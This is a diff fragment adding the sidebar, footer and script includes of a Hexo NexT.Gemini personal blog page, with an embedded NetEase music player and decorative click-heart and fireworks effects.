+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1859652717&auto=1&height=66"></iframe>
+        </iframe>
+      </div>
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">akali</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+<!-- 页面点击出现爱心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+
+<!-- 页面点击出现烟花 -->
+
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+</body>
+</html>
